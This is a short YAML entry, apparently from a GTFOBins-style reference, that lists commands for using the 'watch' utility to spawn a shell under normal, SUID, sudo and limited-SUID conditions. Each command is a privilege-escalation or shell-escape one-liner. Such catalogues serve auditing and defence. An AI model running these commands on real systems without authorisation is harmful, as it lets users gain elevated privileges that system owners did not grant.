---
functions:
  shell:
    - code: watch -x sh -c 'reset; exec sh 1>&0 2>&0'
  suid:
    - description: This keeps the SUID privileges only if the `-x` option is present.
      code: ./watch -x sh -c 'reset; exec sh 1>&0 2>&0'
  sudo:
    - code: sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
  limited-suid:
    - code: ./watch 'reset; exec sh 1>&0 2>&0'
---
